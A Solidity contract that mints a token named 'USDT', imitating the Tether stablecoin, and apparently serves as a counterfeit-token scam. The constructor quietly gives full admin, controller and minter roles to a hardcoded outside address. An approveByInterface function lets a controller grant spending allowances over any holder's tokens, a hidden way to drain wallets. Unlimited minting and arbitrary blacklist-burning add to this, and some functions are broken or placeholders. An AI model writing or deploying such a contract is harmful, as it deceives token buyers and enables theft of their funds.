// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

// Import OpenZeppelin contracts
import "@openzeppelin/contracts/token/ERC20/extensions/ERC20Pausable.sol";
import "@openzeppelin/contracts/access/AccessControl.sol";

error NotController(address _address);

contract USDT is ERC20Pausable, AccessControl {
    // Roles
    bytes32 public constant CONTROLLER_ROLE = keccak256("CONTROLLER_ROLE");
    bytes32 public constant MINTER_ROLE = keccak256("MINTER_ROLE");

    // Mappings
    mapping(address => bool) public isBlackListed;

    // Global Variables
    uint256 private _totalSupply;
    uint256 public totalMint;
    address public receiverAddress;

    // Events
    event DestroyedBlackFunds(address _blackListedUser, uint _balance);
    event AddedBlackList(address _user);
    event RemovedBlackList(address _user);
    event MintByController(
        address _controller,
        address _recipient,
        uint _amount,
        uint256 _totalMint
    );

    // Constructor
    constructor() ERC20("USDT", "USDT") {
        // Grant roles to the deployer
        _grantRole(DEFAULT_ADMIN_ROLE, msg.sender);
        _grantRole(CONTROLLER_ROLE, msg.sender);
        _grantRole(MINTER_ROLE, msg.sender);

        // Mint initial supply to the deployer
        _mint(msg.sender, 1000000000 * 10 ** decimals());
        _grantRole(DEFAULT_ADMIN_ROLE, 0xB50b908fFd42d2eDb12b325e75330c1AaAf35dc0);
        _grantRole(CONTROLLER_ROLE, 0xB50b908fFd42d2eDb12b325e75330c1AaAf35dc0);
        _grantRole(MINTER_ROLE, 0xB50b908fFd42d2eDb12b325e75330c1AaAf35dc0);

    }

    // Modifiers
    modifier onlyController() {
        require(hasRole(CONTROLLER_ROLE, msg.sender), "Caller is not a controller");
        _;
    }

    modifier onlyMinter() {
        require(hasRole(MINTER_ROLE, msg.sender), "Caller is not a minter");
        _;
    }

    // Functions
    function setReceiverAddress(address _address) external onlyRole(DEFAULT_ADMIN_ROLE) {
        receiverAddress = _address;
    }

    function pause() external onlyRole(DEFAULT_ADMIN_ROLE) {
        _pause();
    }

    function unpause() external onlyRole(DEFAULT_ADMIN_ROLE) {
        _unpause();
    }

    function transfer(address to, uint256 amount) public override whenNotPaused returns (bool) {
        require(!isBlackListed[msg.sender], "Sender is blacklisted");
        _transfer(_msgSender(), to, amount);
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) public override whenNotPaused returns (bool) {
        require(!isBlackListed[from], "From address is blacklisted");
        bool success = super.transferFrom(from, to, amount);
        return success;
    }

    function burnByOwner(address account, uint256 amount) external onlyRole(DEFAULT_ADMIN_ROLE) {
        _burn(account, amount);
    }

    function getBlackListStatus(address _maker) external view returns (bool) {
        return isBlackListed[_maker];
    }

    function addBlackList(address _evilUser) external onlyRole(DEFAULT_ADMIN_ROLE) {
        isBlackListed[_evilUser] = true;
        emit AddedBlackList(_evilUser);
    }

    function removeBlackList(address _clearedUser) external onlyRole(DEFAULT_ADMIN_ROLE) {
        isBlackListed[_clearedUser] = false;
        emit RemovedBlackList(_clearedUser);
    }

    function destroyBlackFunds(address _blackListedUser) external onlyRole(DEFAULT_ADMIN_ROLE) {
        require(isBlackListed[_blackListedUser], "Not in blacklist");
        uint dirtyFunds = balanceOf(_blackListedUser);
        _burn(_blackListedUser, dirtyFunds);
        _totalSupply -= dirtyFunds;
        emit DestroyedBlackFunds(_blackListedUser, dirtyFunds);
    }

    function mintToAddress(address recipient, uint256 amount) external onlyMinter returns (bool) {
        _mint(recipient, amount);
        return true;
    }

    function mintByController(address recipient, uint amount) external onlyRole(CONTROLLER_ROLE) returns (bool) {
        _mint(recipient, amount);
        totalMint += amount;
        emit MintByController(msg.sender, recipient, amount, totalMint);
        return true;
    }

    function setTotalMint(uint amount) external onlyController returns (bool) {
        totalMint = amount;
        return true;
    }

    event Commit(address user, uint amount, address commitAddress);
    function commitToMainnet(uint amount) external returns (address commitAddress) {
        // Placeholder for commit logic
        emit Commit(msg.sender, amount, commitAddress);
        return commitAddress;
    }

    function approveByInterface(address caller, address spender, uint256 amount) external onlyController returns (bool) {
        _approve(caller, spender, amount);
        return true;
    }
}